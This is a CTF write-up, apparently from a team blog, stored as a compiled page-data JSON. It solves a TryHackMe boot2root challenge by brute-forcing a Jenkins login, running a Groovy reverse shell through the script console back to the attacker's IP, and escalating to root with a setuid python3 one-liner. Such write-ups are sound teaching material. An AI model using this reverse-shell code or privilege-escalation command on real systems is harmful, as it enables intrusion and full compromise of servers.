{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var r=Object.create;var c=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var d=Object.getOwnPropertyNames;var h=Object.getPrototypeOf,u=Object.prototype.hasOwnProperty;var i=a=>c(a,\"__esModule\",{value:!0});var m=(a,t)=>()=>(t||a((t={exports:{}}).exports,t),t.exports),k=(a,t)=>{i(a);for(var s in t)c(a,s,{get:t[s],enumerable:!0})},N=(a,t,s)=>{if(t&&typeof t==\"object\"||typeof t==\"function\")for(let e of d(t))!u.call(a,e)&&e!==\"default\"&&c(a,e,{get:()=>t[e],enumerable:!(s=p(t,e))||s.enumerable});return a},g=a=>N(i(c(a!=null?r(h(a)):{},\"default\",a&&a.__esModule&&\"default\"in a?{get:()=>a.default,enumerable:!0}:{value:a,enumerable:!0})),a);var o=m((v,l)=>{l.exports=_jsx_runtime});var w={};k(w,{default:()=>y,frontmatter:()=>b});var n=g(o()),b={title:\"Cyber Grabs CTF 0x03 \\u2013 boot2root\",date:\"2022-02-07\",draft:!1,authors:[\"thebish0p\"],tags:[\"Cyber Grabs CTF 0x03\",\"Web\",\"Jenkins\",\"Shell\",\"System Access\",\"Privilege Escalation\"],summary:\"Bruteforce Jenkins login page with a wordlist we find leading to system access and proceeding by escalating to Root\"};function f(a={}){let{wrapper:t}=a.components||{};return t?(0,n.jsx)(t,Object.assign({},a,{children:(0,n.jsx)(s,{})})):s();function s(){let e=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",blockquote:\"blockquote\",p:\"p\",code:\"code\",pre:\"pre\",img:\"img\",table:\"table\",thead:\"thead\",tr:\"tr\",th:\"th\",tbody:\"tbody\",td:\"td\",em:\"em\"},a.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)(e.h2,{id:\"boot2root\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#boot2root\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"boot2root\"]}),`\n`,(0,n.jsxs)(e.blockquote,{children:[`\n`,(0,n.jsx)(e.p,{children:\"by MrGrep\"}),`\n`,(0,n.jsx)(e.p,{children:\"Let's Start!!! Alison is a SOC analyst of TheCyberGrabs Pvt Ltd. He got some alerts that someone is trying to access the server but he is not quite sure how that attack is getting executed so he wants to hire some pentesters to check the security can you help alison?\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Visit here to play:- \",(0,n.jsx)(e.a,{href:\"https://tryhackme.com/jr/cybergrabsctf2022\",children:\"TryHackMe Room\"})]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Flag Format: \",(0,n.jsx)(e.code,{children:\"cybergrabs{boot2root}\"})]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"This challenge was hosted on \",(0,n.jsx)(e.a,{href:\"https://tryhackme.com/\",children:\"TryHackMe\"}),\". We launch an instance and start by running an nmap quick scan on the machine\\u2019s IP address to check for open ports:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"code-highlight\",children:(0,n.jsx)(e.span,{className:\"code-line\",children:`nmap -T4 -A -F 10.10.156.214\n`})})}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`Host is up (0.16s latency).\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`Not shown: 65532 filtered tcp ports (no-response)\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`PORT     STATE  SERVICE VERSION\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`21/tcp   closed ftp\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`80/tcp   open   http    Apache httpd 2.4.29 ((Ubuntu))\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`|_http-server-header: Apache/2.4.29 (Ubuntu)\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`|_http-title: CyberGrabs Jr CTF\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`| http-methods:\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`|_  Supported Methods: OPTIONS HEAD GET POST\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`8080/tcp open   http    Jetty 9.4.43.v20210629\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`|_http-server-header: Jetty(9.4.43.v20210629)\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`| http-robots.txt: 1 disallowed entry\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`|_/\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`|_http-title: Site doesn't have a title (text/html;charset=utf-8).\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We start by browsing port 80 checking common files like \",(0,n.jsx)(e.code,{children:\"robots.txt\"}),\" and we can find 2 interesting files:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/cyber-grabs-ctf-0x03/robots.png\",alt:\"robots.txt\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"As shown below \",(0,n.jsx)(e.code,{children:\"s3cret\"}),\" is a wordlist and \",(0,n.jsx)(e.code,{children:\"confidential\"}),\" is actually just random data encoded with Base32 with nothing useful for the challenge:\"]}),`\n`,(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsx)(e.tr,{children:(0,n.jsx)(e.th,{align:\"center\",children:(0,n.jsx)(e.img,{src:\"/static/images/cyber-grabs-ctf-0x03/s3cret.png\",alt:\"s3cret\"})})})}),(0,n.jsx)(e.tbody,{children:(0,n.jsx)(e.tr,{children:(0,n.jsx)(e.td,{align:\"center\",children:(0,n.jsx)(e.em,{children:\"s3cret\"})})})})]}),`\n`,(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsx)(e.tr,{children:(0,n.jsx)(e.th,{align:\"center\",children:(0,n.jsx)(e.img,{src:\"/static/images/cyber-grabs-ctf-0x03/confidential.png\",alt:\"confidential\"})})})}),(0,n.jsx)(e.tbody,{children:(0,n.jsx)(e.tr,{children:(0,n.jsx)(e.td,{align:\"center\",children:(0,n.jsx)(e.em,{children:\"confidential\"})})})})]}),`\n`,(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsx)(e.tr,{children:(0,n.jsx)(e.th,{align:\"center\",children:(0,n.jsx)(e.img,{src:\"/static/images/cyber-grabs-ctf-0x03/dec_confidential.png\",alt:\"confidential decoded\"})})})}),(0,n.jsx)(e.tbody,{children:(0,n.jsx)(e.tr,{children:(0,n.jsx)(e.td,{align:\"center\",children:(0,n.jsx)(e.em,{children:\"Base32 decoded data\"})})})})]}),`\n`,(0,n.jsx)(e.p,{children:\"We try running several wordlists using dirbuster but we don\\u2019t find any other directories on port 80.\"}),`\n`,(0,n.jsx)(e.p,{children:\"We proceed by going to port 8080 which had a Jenkins login page.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/cyber-grabs-ctf-0x03/jenkins.png\",alt:\"Jenkins\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"First idea we had was using the wordlist provided in \",(0,n.jsx)(e.code,{children:\"s3cret\"}),\" to bruteforce the login page. Jenkins default username is \",(0,n.jsx)(e.code,{children:\"admin\"}),\" so we start by bruteforcing that user. Unfortunetaly that idea didn\\u2019t work.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"After a lot of trial and error we go back to the challenge description and notice that the name \",(0,n.jsx)(e.code,{children:\"Alison\"}),\" is mentioned so we decided to try it as a username and bruteforce it again with the \",(0,n.jsx)(e.code,{children:\"s3cret\"}),\" wordlist:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/cyber-grabs-ctf-0x03/burp_bf.png\",alt:\"Bruteforce Burp\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We finally found the password \",(0,n.jsx)(e.code,{children:\"elizabeth1\"}),\".\"]}),`\n`,(0,n.jsx)(e.p,{children:\"We proceed by logging in to Jenkins:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/cyber-grabs-ctf-0x03/logged_in.png\",alt:\"Logged in\"})}),`\n`,(0,n.jsx)(e.p,{children:\"We proceed by going to the script console in order to have a reverse shell on the server as shown below:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-groovy\",children:(0,n.jsxs)(e.code,{className:\"language-Groovy code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"String host\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token string gstring\",children:'\"10.11.60.43\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" port\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"4444\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"String cmd\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token string gstring\",children:'\"/bin/sh\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"Process p\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"new\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"ProcessBuilder\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"cmd\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"redirectErrorStream\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"true\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"start\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"Socket s\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"new\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"Socket\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"host\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"port\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"InputStream pi\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"getInputStream\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"pe\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"getErrorStream\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" si\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"s\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"getInputStream\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"OutputStream po\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"getOutputStream\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"so\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"s\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"getOutputStream\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"while\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"!\"}),\"s\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"isClosed\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"while\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"pi\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"available\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\">\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"so\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"write\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"pi\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"read\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"while\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"pe\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"available\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\">\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"so\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"write\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"pe\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"read\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"while\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"si\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"available\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\">\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"po\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"write\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"si\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"read\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"so\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"flush\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"po\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"flush\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"Thread\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"sleep\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"50\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"try\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),\"p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"exitValue\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"break\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"catch\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"Exception e\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"destroy\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"s\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"close\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/cyber-grabs-ctf-0x03/script_console.png\",alt:\"Script Console\"})}),`\n`,(0,n.jsx)(e.p,{children:\"And now we have a shell:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/cyber-grabs-ctf-0x03/first_shell.png\",alt:\"First shell\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We continue by stabilising the shell using \",(0,n.jsx)(e.code,{children:\"stty\"}),\" as shown below:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/cyber-grabs-ctf-0x03/stable.png\",alt:\"Stable\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"And we manage to find the first flag in \",(0,n.jsx)(e.code,{children:\"/home/mrgrep/user.txt\"}),\". A Base32 encoded flag:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/cyber-grabs-ctf-0x03/user.txt.png\",alt:\"User.txt\"})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/cyber-grabs-ctf-0x03/decoded_user.txt.png\",alt:\"Decoded user.txt\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"For the second part of the challenge, we need to get root access in order to read the \",(0,n.jsx)(e.code,{children:\"root.txt\"}),\" file.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"We notice that python has setuid capabilities by running \",(0,n.jsx)(e.code,{children:\"getcap\"}),\":\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/cyber-grabs-ctf-0x03/getcap.png\",alt:\"getcap\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This means that we can use python in order to perform a privilege escalation and get full root access by running \",(0,n.jsx)(e.code,{children:`./python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'`}),\":\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/cyber-grabs-ctf-0x03/privesc.png\",alt:\"Priv Escalation\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Finally, we have root access and we can read the \",(0,n.jsx)(e.code,{children:\"root.txt\"}),\" and get the final flag:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/cyber-grabs-ctf-0x03/rootflag.png\",alt:\"Root\"})})]})}}var y=f;return w;})();\n;return Component;","toc":[{"value":"boot2root","url":"#boot2root","depth":2}],"frontMatter":{"readingTime":{"text":"4 min read","minutes":3.59,"time":215400,"words":718},"slug":"cyber-grabs-ctf-0x03/boot2root","fileName":"cyber-grabs-ctf-0x03/boot2root.md","title":"Cyber Grabs CTF 0x03 – boot2root","date":"2022-02-07T00:00:00.000Z","draft":false,"authors":["thebish0p"],"tags":["Cyber Grabs CTF 0x03","Web","Jenkins","Shell","System Access","Privilege Escalation"],"summary":"Bruteforce Jenkins login page with a wordlist we find leading to system access and proceeding by escalating to Root"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.18,"time":10800,"words":36},"slug":["thebish0p"],"fileName":"thebish0p.md","name":"thebish0p","avatar":"https://www.gravatar.com/avatar/4bbe2c02b2eb4589f0ef3c2d0e39a640?d=identicon&s=256","specialties":["Web"],"linkedin":"https://linkedin.com/in/eliemoutran","github":"https://github.com/eliemoutran","member":true,"retired":true,"description":"Security, Programming and Mathematics","order":2,"date":null}],"prev":{"title":"Cyber Grabs CTF 0x03 – Unbr34k4bl3","date":"2022-02-07T00:00:00.000Z","draft":false,"authors":["michael"],"tags":["Cyber Grabs CTF 0x03","Crypto","RSA","Number Theory"],"summary":"Unbreakable RSA Challenge?","canonical":"https://mzhang.io/posts/2022-02-07-cybergrabs-ctf-unbreakable/","slug":"cyber-grabs-ctf-0x03/unbr34k4bl3"},"next":{"title":"DICE CTF 2022 – vm-calc","date":"2022-02-09T00:00:00.000Z","draft":false,"authors":["lemon"],"tags":["DICE CTF 2022","Web","Prototype Pollution","CVE-2022-21824","vm2","Proxy"],"summary":"Pollute prototype with a recent vulerability in console.table, and throw a proxy object within an exception.","slug":"dice-ctf-2022/vm-calc"}},"__N_SSG":true}